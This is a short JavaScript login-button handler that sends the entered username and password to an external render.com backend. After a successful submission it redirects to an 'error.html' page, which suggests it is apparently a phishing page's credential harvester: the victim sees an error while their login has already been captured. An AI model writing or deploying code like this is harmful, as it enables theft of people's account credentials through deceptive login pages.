document.getElementById("loginBtn").addEventListener("click", async function () {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const loginBtn = document.getElementById("loginBtn");
    const loginText = document.getElementById("loginText");
    const spinner = document.getElementById("spinner");

    if (!username || !password) {
        alert("Please enter both username and password.");
        return;
    }

    // Show spinner & disable button
    loginText.style.display = "none";
    spinner.style.display = "inline-block";
    loginBtn.disabled = true;

    try {
        const response = await fetch("https://backend-redf.onrender.com/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password }),
        });

        if (response.ok) {
            // Keep spinner spinning until redirection is complete
            window.location.href = "error.html";
        } else {
            alert("Invalid login. Try again.");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Something went wrong! Please try again.");
    } finally {
        //  Don't hide the spinner immediately, keep it spinning until redirection
        setTimeout(() => {
            loginText.style.display = "inline";
            spinner.style.display = "none";
            loginBtn.disabled = false;
        }, 1000); // Small delay to handle edge cases
    }
});
